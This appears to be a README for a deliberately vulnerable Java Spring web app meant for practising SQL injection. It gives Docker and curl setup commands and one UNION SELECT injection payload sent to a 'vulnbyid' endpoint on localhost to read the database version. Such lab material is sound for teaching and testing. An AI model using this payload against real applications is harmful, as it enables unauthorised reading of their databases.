# TL;DR

``````
sudo docker build -t sqli_victim_webapp_java_spring .; sudo docker run --name victim.sqli.webapp_java_spring.tld -ti -p 127.0.0.1:5808:8080 sqli_victim_webapp_java_spring
curl 'localhost:5808/sqlidemo/all'
curl localhost:5808/sqlidemo/add -d username=user -d password=password
sudo docker exec -ti victim.sqli.webapp_java_spring.tld mysql --host localhost -uuser -ppassword sqli_example
```

# SQLi

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- "
```
